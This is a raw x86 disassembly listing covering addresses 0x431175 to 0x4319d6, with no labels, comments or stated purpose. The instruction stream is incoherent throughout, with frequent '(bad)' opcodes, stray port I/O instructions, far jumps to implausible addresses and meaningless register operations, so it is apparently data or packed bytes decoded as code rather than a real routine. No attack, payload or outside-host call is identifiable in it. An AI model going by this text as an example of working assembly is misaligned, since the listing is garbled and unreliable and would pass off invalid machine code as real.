  431175:	add    BYTE PTR [edi+0x546c16c0],dh
  43117b:	add    BYTE PTR [ecx-0x5],dl
  43117e:	add    eax,0x17200
  431183:	sbb    al,0x85
  431185:	dec    esp
  431186:	je     0x4311c0
  431188:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43118c:	add    BYTE PTR [ebx],bh
  43118e:	(bad)  
  43118f:	and    al,0x32
  431191:	jae    0x43112f
  431193:	mov    cl,cl
  431195:	inc    DWORD PTR [esp]
  431198:	push   ebp
  431199:	shr    esp,0x8
  43119c:	in     al,dx
  43119d:	push   esp
  43119e:	add    DWORD PTR [eax],esp
  4311a0:	add    bl,cl
  4311a2:	inc    ebp
  4311a3:	mov    bh,0x89
  4311a5:	add    ah,bh
  4311a7:	jmp    0xca7520f1
  4311ac:	pushf  
  4311ad:	dec    esp
  4311ae:	mov    edx,0xf8178520
  4311b3:	fst    DWORD PTR [ebp+0x0]
  4311b6:	mov    BYTE PTR [eax],0xc4
  4311b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4311bc:	inc    ebp
  4311bd:	add    eax,0xc601da
  4311c2:	mov    al,0xc6
  4311c5:	ins    BYTE PTR es:[edi],dx
  4311c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311cd:	dec    esp
  4311ce:	jmp    DWORD PTR [eax]
  4311d0:	inc    ebp
  4311d1:	fnstcw WORD PTR [esi+0x29]
  4311d4:	test   BYTE PTR [eax],0xc8
  4311d7:	rol    BYTE PTR [eax],0xc0
  4311da:	lea    ecx,[ebp-0x3cf0dbcb]
  4311e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311e6:	inc    esi
  4311e7:	add    DWORD PTR [eax],ebx
  4311e9:	add    dh,bh
  4311eb:	mov    esi,DWORD PTR [edx+0x8]
  4311ee:	(bad)  
  4311ef:	fdiv   QWORD PTR ss:[ecx]
  4311f2:	(bad)  
  4311f3:	mov    bl,ch
  4311f5:	add    esi,eax
  4311f7:	add    dh,bl
  4311f9:	or     esi,eax
  4311fb:	mov    dl,0xdf
  4311fd:	add    esi,eax
  4311ff:	add    al,ah
  431201:	push   cs
  431202:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431209:	or     BYTE PTR [ebx],dh
  43120b:	dec    ecx
  43120c:	lea    eax,[ebx]
  43120e:	xor    eax,0x18fc0fc7
  431213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431214:	repz clc 
  431216:	add    eax,DWORD PTR [ebp+0x46]
  431219:	prefetcht0 BYTE PTR [ecx-0x2]
  43121d:	xor    eax,0x7c60872
  431222:	mov    esp,0xbd32c69b
  431227:	pop    esi
  431228:	mov    cl,0xbe
  43122b:	or     al,0xc6
  43122d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431234:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43123b:	add    dh,al
  43123d:	mov    eax,ebx
  43123f:	xor    DWORD PTR [ebx],0x35008dbc
  431245:	mov    ecx,DWORD PTR [edi]
  431247:	sbb    al,0x18
  431249:	inc    ebp
  43124a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431251:	clc    
  431252:	(bad)  
  431253:	xor    DWORD PTR [edx-0x64],esi
  431256:	lea    ecx,[ecx+0x45ffe838]
  43125c:	mov    ecx,ebx
  43125e:	fadd   st,st(6)
  431260:	dec    ebp
  431261:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431267:	out    0x1,eax
  431269:	inc    ebp
  43126a:	lea    ebp,ds:0xc8ffc6ff
  431270:	enter  0xa33,0xc6
  431274:	push   ebp
  431275:	leave  
  431276:	(bad)  
  431277:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43127d:	add    BYTE PTR [ebp+0x44],al
  431280:	mov    eax,esp
  431282:	mov    WORD PTR [esi+0x46398300],?
  431288:	psubusw mm4,QWORD PTR [esi-0x78]
  43128c:	add    BYTE PTR [ebx-0x1303f975],al
  431292:	add    BYTE PTR [ebp+0x1],0xeb
  431296:	add    BYTE PTR [ebp+0x38],al
  431299:	in     eax,dx
  43129a:	inc    ebp
  43129b:	inc    ebp
  43129c:	mov    ebx,ebx
  43129e:	add    BYTE PTR [ebp+0x0],0xec
  4312a2:	mov    DWORD PTR [ebp-0x41],eax
  4312a5:	sub    eax,0x2c00454e
  4312aa:	ins    DWORD PTR es:[edi],dx
  4312ab:	inc    ebp
  4312ac:	add    BYTE PTR [esi+0x66],bh
  4312af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312c0:	dec    edi
  4312c1:	pop    es
  4312c2:	add    ah,ch
  4312c4:	mov    DWORD PTR [ebp+0x68],eax
  4312c7:	in     eax,dx
  4312c8:	inc    DWORD PTR [ebp-0x7d]
  4312cb:	out    0xc0,al
  4312cd:	inc    ebp
  4312ce:	mov    edx,esp
  4312d0:	push   0x45
  4312d2:	(bad)  
  4312d3:	jmp    0xdf925890
  4312d8:	add    BYTE PTR [ebp-0x77],al
  4312db:	out    dx,al
  4312dc:	ins    BYTE PTR es:[edi],dx
  4312dd:	inc    ebp
  4312de:	jmp    edi
  4312e0:	add    DWORD PTR [ebp-0x14],0x7e
  4312e4:	mov    esi,esi
  4312e6:	outs   dx,BYTE PTR ds:[esi]
  4312e7:	inc    esp
  4312e8:	(bad)  
  4312e9:	mov    esp,0x8341b68d
  4312ee:	mov    DWORD PTR [esi+0x70],eax
  4312f1:	fcos   
  4312f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4312f9:	in     al,dx
  4312fa:	jb     0x431281
  4312fc:	(bad)  
  4312fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431303:	mov    edi,edi
  431305:	fdivr  st,st(7)
  431307:	out    dx,eax
  431308:	rcl    BYTE PTR [ebx],0x66
  43130b:	mov    DWORD PTR [ebp-0xc70075],eax
  431311:	(bad)  
  431312:	std    
  431313:	cmp    eax,DWORD PTR [eax]
  431315:	jne    0x43137d
  431317:	mov    DWORD PTR [ebp-0xba0048],eax
  43131d:	in     al,dx
  43131e:	outs   dx,BYTE PTR ds:[esi]
  43131f:	pushf  
  431320:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431326:	inc    DWORD PTR [ecx]
  431328:	inc    DWORD PTR [eax]
  43132a:	jae    0x431364
  43132c:	add    BYTE PTR [ebp+0x850266],al
  431332:	inc    DWORD PTR [ebp-0x1]
  431335:	mov    eax,eax
  431337:	jl     0x43139f
  431339:	add    BYTE PTR [ebp-0x740077],al
  43133f:	cld    
  431340:	dec    eax
  431341:	add    BYTE PTR [eax],0x1
  431344:	data16 add BYTE PTR [ebp+0x38],al
  431348:	mov    eax,0x47c2
  43134d:	mov    eax,0x824f89
  431352:	inc    edi
  431353:	mov    DWORD PTR [edx+0x64],ebp
  431356:	inc    WORD PTR [ebp-0x75]
  43135a:	(bad)  
  43135b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431362:	inc    ebp
  431363:	jge    0x431344
  431365:	add    bh,ah
  431367:	lea    ax,[ebp-0x750030]
  43136e:	add    al,0x46
  431371:	jmp    0x40ff:0x8885
  431377:	push   DWORD PTR [ebp+0x52]
  43137a:	lea    eax,[eax]
  43137c:	shl    BYTE PTR [esi-0x7b],1
  43137f:	test   esi,edi
  431381:	(bad)  
  431382:	(bad)  
  431383:	inc    DWORD PTR [ebp-0x990140]
  431389:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43138f:	inc    edi
  431390:	push   ecx
  431391:	xor    ax,WORD PTR [ebp-0x8d0045]
  431398:	add    al,al
  43139a:	ret    
  43139b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313a2:	push   eax
  4313a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313aa:	add    BYTE PTR [ebx-0x764f8839],al
  4313b0:	push   DWORD PTR [esi+0x1]
  4313b3:	inc    DWORD PTR [eax]
  4313b5:	mov    eax,0xff99ff
  4313ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313c0:	jne    0x43137a
  4313c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313cc:	mov    ecx,0xd74fb8
  4313d1:	add    cl,al
  4313d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313e0:	(bad)  
  4313e1:	push   ebp
  4313e3:	mov    eax,0x8c2789
  4313e8:	ret    0x6689
  4313eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4313ef:	add    bh,ah
  4313f1:	mov    WORD PTR [ebp-0x70],ax
  4313f5:	(bad)  
  4313f6:	ret    0x667d
  4313f9:	or     BYTE PTR [ebp-0x77],dl
  4313fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431403:	loop   0x43138e
  431405:	(bad)  
  431406:	xchg   esi,eax
  431407:	aam    0xcf
  431409:	out    dx,al
  43140a:	mov    DWORD PTR [esi-0x68],edi
  43140d:	inc    ebp
  43140e:	dec    edx
  43140f:	pop    ecx
  431410:	mov    edx,DWORD PTR [eax]
  431412:	repnz push bp
  431415:	or     BYTE PTR [ebx+0x55106638],0x49
  43141c:	(bad)  
  43141d:	repnz xor eax,0xa0898945
  431423:	mov    ah,0x89
  431425:	jmp    DWORD PTR [edx+0x66b0418d]
  43142b:	inc    DWORD PTR [ebp+0x50]
  43142e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431432:	mov    DWORD PTR [eax],ecx
  431434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431435:	pop    es
  431436:	inc    ecx
  431437:	(bad)  
  431438:	data16 fwait
  43143a:	inc    ebp
  43143b:	xor    ah,BYTE PTR [esi+0x3]
  43143e:	dec    ebp
  43143f:	push   eax
  431440:	inc    bp
  431442:	jge    0x4313c7
  431444:	mov    esp,DWORD PTR [esi-0x18]
  431447:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43144d:	add    DWORD PTR [ebx],esi
  43144f:	add    BYTE PTR [ebx],al
  431451:	test   DWORD PTR [ebx],esi
  431453:	(bad)  
  431454:	inc    WORD PTR [ebp+0x0]
  431458:	mov    eax,DWORD PTR [eax]
  43145a:	call   0x8898cb8f
  43145f:	mov    esi,eax
  431461:	clc    
  431462:	ret    
  431463:	rol    cl,0xa
  431466:	mov    DWORD PTR ds:0x7c0ec88,esi
  43146c:	mov    edx,edi
  43146e:	pushf  
  43146f:	pop    es
  431470:	jmp    FWORD PTR [edx+0x66]
  431473:	add    BYTE PTR [ebp-0x990175],al
  431479:	inc    ebp
  43147a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431480:	push   ebp
  431481:	mov    edi,eax
  431483:	mov    dh,BYTE PTR [eax+0x266ff51]
  431489:	push   ebp
  43148a:	add    BYTE PTR [ebx-0x764b0777],al
  431490:	dec    DWORD PTR [esi+0x661851e8]
  431496:	add    BYTE PTR [ebp-0x7b],dl
  431499:	cmp    esi,0xfffffffb
  43149c:	dec    DWORD PTR [ecx+0x51fe9285]
  4314a2:	jmp    DWORD PTR [esi-0x75]
  4314a5:	push   ebp
  4314a6:	hlt    
  4314a7:	data16 (bad) 
  4314a9:	dec    ebp
  4314aa:	ret    
  4314ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314b1:	lea    edx,[eax-0x1]
  4314b4:	jne    0x431487
  4314b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314bc:	dec    BYTE PTR [ecx+0x51559eff]
  4314c2:	mov    DWORD PTR [esi-0x4c],esp
  4314c5:	push   ebp
  4314c6:	jmp    DWORD PTR [esi-0x18]
  4314c9:	inc    ebp
  4314ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314d0:	(bad)  
  4314d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314d2:	inc    eax
  4314d4:	test   DWORD PTR [esi-0x2],esp
  4314d7:	inc    ebp
  4314d8:	dec    DWORD PTR [ebp-0x760bde75]
  4314de:	(bad)  
  4314df:	test   al,0xc3
  4314e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314e7:	lods   al,BYTE PTR ds:[esi]
  4314e8:	push   eax
  4314e9:	inc    ebp
  4314ea:	jne    0x4314fb
  4314ec:	dec    DWORD PTR [ebp+0x8]
  4314ef:	mov    ecx,DWORD PTR [ebx]
  4314f1:	sbb    al,0x0
  4314f3:	(bad)  
  4314f4:	mov    eax,0xc14fc3
  4314f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4314ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431503:	xor    eax,DWORD PTR [eax]
  431505:	add    eax,edi
  431507:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43150d:	xor    edi,DWORD PTR [eax+0x854f66]
  431513:	dec    BYTE PTR [ecx-0x76bb01]
  431519:	mov    BYTE PTR [ebx-0x76724001],al
  43151f:	pushf  
  431520:	inc    esi
  431521:	(bad)  
  431522:	dec    DWORD PTR [ebp-0x7abe6373]
  431528:	sar    esi,0x89
  43152b:	dec    DWORD PTR [eax+0x0]
  43152e:	inc    DWORD PTR [eax]
  431530:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431537:	xlat   BYTE PTR ds:[ebx]
  431538:	dec    edx
  431539:	add    bh,bh
  43153b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431541:	lea    esp,[esi-0x50]
  431544:	(bad)  
  431545:	(bad)  
  431546:	call   DWORD PTR [eax-0x1]
  431549:	inc    ebp
  43154a:	rdpmc  
  43154c:	add    BYTE PTR [ebx],al
  43154e:	push   ax
  431550:	lea    eax,[ebp-0x1]
  431556:	js     0x431557
  431558:	add    al,bh
  43155a:	push   bp
  43155c:	lea    ecx,[ebp-0x7701]
  431562:	fmul   DWORD PTR [ebp-0x7a997800]
  431568:	(bad)  
  431569:	(bad)  
  43156a:	(bad)  
  43156b:	(bad)  
  43156c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431572:	dec    eax
  431573:	mov    eax,0x8d8dffff
  431578:	mov    al,0xb0
  43157a:	(bad)  
  43157b:	call   DWORD PTR [ecx+0x50]
  43157e:	dec    ebp
  43157f:	inc    ebp
  431580:	mov    esi,0x7030833
  431585:	push   eax
  431586:	into   
  431587:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43158d:	call   DWORD PTR [ecx-0x8]
  431590:	lea    edx,[ebp-0x1]
  431593:	jmp    0x761797
  431598:	inc    eax
  431599:	jnp    0x431528
  43159b:	add    dh,bh
  43159d:	inc    WORD PTR [ebp-0x8a00b0]
  4315a4:	mov    edx,eax
  4315a6:	inc    esp
  4315a7:	add    bh,bh
  4315a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315af:	dec    DWORD PTR [ebx-0x7f820301]
  4315b5:	add    BYTE PTR [ecx],al
  4315b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4315be:	inc    eax
  4315c0:	(bad)  
  4315c1:	dec    si
  4315c3:	test   edi,edi
  4315c5:	(bad)  
  4315c6:	cmp    edi,edi
  4315c8:	add    ecx,DWORD PTR [edi-0x39]
  4315cb:	mov    edx,DWORD PTR [edx+0x66]
  4315ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4315d4:	mov    eax,0x66ff8b5e
  4315da:	jmp    0xb4ff:0xc7ff3895
  4315e1:	push   ecx
  4315e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315e8:	call   DWORD PTR [esi-0x1]
  4315eb:	dec    DWORD PTR [eax]
  4315ed:	mov    ecx,0x805ff
  4315f2:	inc    ebp
  4315f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4315f9:	mov    ecx,0x35784
  4315fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431604:	inc    ebp
  431605:	mov    ecx,0x9c6131
  43160a:	(bad)  
  43160b:	mov    eax,ebx
  43160d:	pop    esp
  43160e:	test   edi,edi
  431610:	clc    
  431611:	lea    eax,[ebp-0x24]
  431614:	cmp    eax,0xc7fe9c8d
  431619:	push   eax
  43161b:	lea    eax,[ebp+0x45fff8fe]
  431621:	mov    esi,DWORD PTR [ecx]
  431623:	hlt    
  431624:	lahf   
  431625:	push   esp
  431626:	mov    edx,DWORD PTR [ecx-0x4]
  431629:	xor    eax,DWORD PTR [eax+0x7201bb]
  43162f:	add    BYTE PTR [ebp-0x35],al
  431632:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431638:	mov    edx,DWORD PTR [ecx-0x74]
  43163b:	rol    BYTE PTR [eax],0x8d
  43163e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431642:	nop
  431643:	push   ecx
  431644:	add    bh,bh
  431646:	mov    esp,edi
  431648:	in     al,0x85
  43164a:	jge    0x43164a
  43164c:	test   edi,edi
  43164e:	jne    0x4315d5
  431650:	(bad)  
  431651:	(bad)  
  431652:	sbb    bh,bh
  431654:	push   ebp
  431655:	inc    ebp
  431656:	call   0xffdc10e6
  43165b:	add    BYTE PTR [ebp+0x66],al
  43165e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431664:	cmp    al,0x85
  431666:	ud0    eax,DWORD PTR [ebp-0x1]
  43166a:	test   DWORD PTR [edi+0x74],ecx
  43166d:	dec    edi
  43166e:	inc    DWORD PTR [ebp-0x530004]
  431674:	dec    DWORD PTR [edi-0x75]
  431677:	dec    esi
  431678:	cld    
  431679:	test   DWORD PTR [eax+0xff01ff],eax
  43167f:	icebp  
  431680:	add    BYTE PTR [edi-0x3a],cl
  431683:	test   ebx,eax
  431685:	inc    BYTE PTR [ebp-0x1]
  431688:	jne    0x43168a
  43168a:	mov    eax,DWORD PTR [eax]
  43168c:	cld    
  43168d:	xor    BYTE PTR [ecx+0x500155],cl
  431693:	push   ebp
  431694:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43169a:	add    BYTE PTR [ebp+0x35e90f50],al
  4316a0:	add    al,BYTE PTR [eax]
  4316a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316a8:	add    ah,ch
  4316aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4316b0:	jmp    0xdf19a6
  4316b5:	(bad)  
  4316b6:	nop    ecx
  4316b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4316bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4316c2:	mov    eax,edi
  4316c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4316c7:	add    eax,0x45fef885
  4316cc:	dec    DWORD PTR [ebx+0x339445]
  4316d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316d8:	dec    DWORD PTR [ebx-0x460f0375]
  4316de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316df:	add    esi,edi
  4316e1:	add    bh,bh
  4316e3:	rdpmc  
  4316e5:	add    BYTE PTR [ebx],0x1
  4316e8:	mov    DWORD PTR [eax],eax
  4316ea:	add    al,0x45
  4316ec:	dec    DWORD PTR [ecx-0x360b3373]
  4316f2:	dec    DWORD PTR [esi]
  4316f4:	push   eax
  4316f5:	jne    0x43173c
  4316f7:	mov    esi,DWORD PTR [ebx]
  4316f9:	cld    
  4316fa:	add    esp,ecx
  4316fc:	push   eax
  4316fd:	inc    DWORD PTR [ebp-0x75]
  431700:	add    eax,0x800e4
  431705:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43170b:	mov    DWORD PTR [ecx],eax
  43170d:	sbb    al,0x0
  43170f:	leave  
  431710:	test   DWORD PTR [edi-0x2],eax
  431713:	jne    0x431714
  431715:	call   0xff44011a
  43171a:	xor    BYTE PTR [ebp+0x4d],al
  43171d:	mov    edi,edi
  43171f:	enter  0x8,0x4d
  431723:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431729:	mov    eax,DWORD PTR [eax]
  43172b:	cld    
  43172c:	add    DWORD PTR [ecx],ebx
  43172e:	inc    ebp
  43172f:	dec    ebp
  431730:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431736:	inc    eax
  431737:	dec    DWORD PTR [ecx-0x270375]
  43173d:	add    BYTE PTR [ebx-0x39d72701],cl
  431743:	xchg   ecx,eax
  431744:	ret    
  431745:	add    BYTE PTR [ebp-0x830075],al
  43174b:	add    BYTE PTR [ebp-0x75],al
  43174e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431754:	lea    edi,[edi-0xc]
  431757:	add    bh,bh
  431759:	mov    edx,DWORD PTR [eax-0x7b]
  43175c:	inc    ebp
  43175d:	rdpmc  
  43175f:	jne    0x431764
  431761:	add    BYTE PTR [eax-0x75],dl
  431764:	inc    ebp
  431765:	clc    
  431766:	add    eax,0x400009
  43176b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431771:	mov    eax,DWORD PTR [ecx]
  431773:	in     al,dx
  431774:	add    dh,al
  431776:	test   ebx,eax
  431778:	inc    BYTE PTR [ebp-0xff0001]
  43177e:	add    BYTE PTR [ebp-0x43],al
  431781:	cmp    esi,0xfffffff8
  431784:	(bad)  
  431785:	push   DWORD PTR [eax]
  431787:	add    BYTE PTR [ebp-0x3a],dl
  43178a:	test   ebx,eax
  43178c:	je     0x431713
  43178e:	mov    edi,edi
  431790:	sbb    al,0xff
  431792:	test   DWORD PTR gs:[eax],eax
  431795:	(bad)  
  431796:	js     0x431797
  431798:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43179e:	sub    eax,ebx
  4317a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317a6:	add    eax,DWORD PTR [eax]
  4317a8:	dec    ebp
  4317a9:	push   eax
  4317aa:	mov    al,BYTE PTR [ebp+0x1]
  4317ad:	mov    eax,DWORD PTR [ebp-0x68]
  4317b0:	mov    eax,DWORD PTR [eax]
  4317b2:	sbb    bh,al
  4317b4:	or     ah,dh
  4317b6:	dec    ebp
  4317b7:	inc    DWORD PTR [eax+0x4]
  4317ba:	push   ecx
  4317bb:	add    BYTE PTR [edx-0x1],dh
  4317be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317d4:	push   ecx
  4317d5:	cmp    BYTE PTR [ebx],al
  4317d7:	inc    ebp
  4317d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317de:	(bad)  
  4317df:	(bad)  
  4317e0:	in     al,0xff
  4317e2:	add    BYTE PTR [ebp+0x0],al
  4317e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317eb:	add    al,bh
  4317ed:	(bad)  
  4317ee:	jmp    0x8d85:0x74b0558d
  4317f5:	dec    DWORD PTR [eax]
  4317f7:	call   DWORD PTR [ebp-0x7b]
  4317fa:	mov    edi,esi
  4317fc:	lock call DWORD PTR [ebp-0x75]
  431800:	mov    esi,esp
  431802:	mov    ah,0xc6
  431804:	mov    bh,0xc3
  431806:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43180c:	add    DWORD PTR [eax],0x450050ff
  431812:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431818:	inc    edi
  43181a:	push   esp
  43181c:	jmp    0xcd00:0x650481ff
  431823:	mov    DWORD PTR [ebx],esi
  431825:	clc    
  431826:	cmp    edi,0xff9cff3c
  43182c:	jne    0x431836
  43182e:	mov    eax,eax
  431830:	add    esi,DWORD PTR [eax]
  431832:	int3   
  431833:	inc    ebp
  431834:	cmp    al,0x83
  431836:	add    BYTE PTR [eax],bl
  431838:	adc    DWORD PTR [ebx+0x768b5055],eax
  43183e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431844:	mov    edi,eax
  431846:	cmp    BYTE PTR [ebp+0x45],cl
  431849:	jmp    0x4317d6
  43184b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43184e:	inc    ebp
  43184f:	or     al,0x2
  431851:	dec    DWORD PTR [ebp+0x18]
  431854:	jne    0x4318ab
  431856:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43185c:	mov    edi,DWORD PTR [ebx]
  43185e:	in     al,0x50
  431860:	xchg   ecx,eax
  431861:	jmp    0x3436766
  431866:	adc    al,0x8b
  431868:	inc    ebp
  431869:	mov    al,ds:0x8b04008b
  43186e:	push   ebp
  43186f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431875:	push   ebp
  431876:	test   DWORD PTR [ebx-0x2800d701],ecx
  43187c:	inc    ebp
  43187d:	dec    ebp
  43187e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431884:	mov    DWORD PTR [eax],0xe9ff00f4
  43188a:	add    al,0x0
  43188c:	add    BYTE PTR [eax],al
  43188e:	mov    eax,edx
  431890:	push   eax
  431891:	rol    DWORD PTR [ebp-0xf0177],1
  431897:	bound  eax,QWORD PTR [ebp+0x50]
  43189a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318a6:	mov    al,0xf
  4318a8:	test   DWORD PTR [edx],edx
  4318aa:	call   DWORD PTR [ebp-0x7a0001]
  4318b0:	(bad)  
  4318b1:	loop   0x4318b2
  4318b3:	jnp    0xc6990cb9
  4318b9:	mov    eax,ebx
  4318bb:	cmp    al,0x8b
  4318bd:	(bad)  
  4318be:	cld    
  4318bf:	shr    esi,0xc
  4318c2:	add    dl,al
  4318c4:	push   eax
  4318c5:	lea    eax,[ebp-0x1]
  4318c8:	mov    edx,esi
  4318ca:	cwde   
  4318cb:	cli    
  4318cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318d2:	or     BYTE PTR [eax],cl
  4318d4:	inc    ebp
  4318d5:	dec    ebp
  4318d6:	inc    DWORD PTR [ebx+0x74803914]
  4318dc:	add    DWORD PTR [ebx+0x451800],ecx
  4318e2:	call   DWORD PTR [eax+edx*1]
  4318e5:	add    ecx,DWORD PTR [ebp-0x34]
  4318e8:	push   edi
  4318e9:	adc    al,0x8
  4318eb:	mov    edx,DWORD PTR [ebp-0x14]
  4318ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4318f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4318f5:	inc    DWORD PTR [eax+esi*8]
  4318f8:	inc    ebp
  4318f9:	stos   BYTE PTR es:[edi],al
  4318fa:	mov    edx,DWORD PTR [ebp-0x4]
  4318fd:	add    DWORD PTR [ebp-0x1c],eax
  431900:	mov    edx,DWORD PTR [ebp-0x70]
  431903:	cmp    eax,DWORD PTR [eax]
  431905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431906:	mov    eax,DWORD PTR [eax]
  431908:	cld    
  431909:	jae    0x43188b
  43190b:	add    eax,DWORD PTR [ecx]
  43190d:	clc    
  43190e:	add    BYTE PTR [eax+0x30],dl
  431911:	mov    DWORD PTR [ecx],esi
  431913:	clc    
  431914:	pop    ds
  431915:	inc    ebp
  431916:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43191c:	(bad)  
  43191d:	push   DWORD PTR [edi]
  43191f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431925:	(bad)  
  431926:	jae    0x431927
  431928:	mov    eax,DWORD PTR [ebp-0x740175]
  43192e:	sub    eax,DWORD PTR [eax]
  431930:	add    eax,DWORD PTR [eax]
  431932:	mov    DWORD PTR [ecx+0x5f],eax
  431935:	mov    DWORD PTR [ebx-0x4],ebx
  431938:	ret    0xff
  43193b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431941:	ret    
  431942:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431948:	add    BYTE PTR [ebp-0x7d],al
  43194b:	mov    DWORD PTR [eax],eax
  43194d:	add    al,0x84
  43194f:	inc    DWORD PTR [ecx]
  431951:	lea    eax,[eax]
  431953:	hlt    
  431954:	sar    bh,cl
  431956:	test   BYTE PTR [eax+0x1],dl
  431959:	inc    ebp
  43195a:	add    BYTE PTR [ebx],dh
  43195c:	test   BYTE PTR [ebx],0x84
  43195f:	push   eax
  431960:	add    BYTE PTR [ebp+0x0],al
  431963:	add    eax,0x86
  431968:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43196e:	add    BYTE PTR [ecx],al
  431970:	add    BYTE PTR [eax],al
  431972:	mov    esi,0x550030
  431977:	mov    ecx,DWORD PTR [edi]
  431979:	cld    
  43197a:	fidiv  DWORD PTR [ebp+0x0]
  43197d:	mov    edi,DWORD PTR [ecx]
  43197f:	xor    BYTE PTR [eax+eax*1],0x84
  431983:	add    eax,DWORD PTR [eax]
  431985:	sbb    BYTE PTR [eax],al
  431987:	jne    0x43193a
  431989:	mov    eax,DWORD PTR [ecx]
  43198b:	sbb    BYTE PTR [eax],al
  43198d:	mov    DWORD PTR [ebp-0x1],esp
  431990:	add    BYTE PTR [eax+0x30e45ca],bh
  431996:	ret    0xb7fc
  431999:	dec    ebp
  43199a:	or     al,0x89
  43199c:	dec    ebp
  43199d:	cld    
  43199e:	cmovne ecx,DWORD PTR [eax-0x75]
  4319a2:	add    edi,esp
  4319a4:	seto   BYTE PTR [esi-0x72ffffff]
  4319ab:	inc    ebp
  4319ac:	adc    al,0x8b
  4319ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319b5:	cmp    DWORD PTR [edi+0x72],edx
  4319b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319be:	gs cmp al,0x0
  4319c1:	je     0x431999
  4319c3:	push   eax
  4319c4:	sar    BYTE PTR [eax],1
  4319c6:	mov    bh,0x3e
  4319c8:	push   cs
  4319c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319cf:	add    DWORD PTR [ecx+0x12],ebp
  4319d2:	dec    edx
  4319d3:	(bad)  
  4319d4:	mov    eax,edx
  4319d6:	in     al,dx
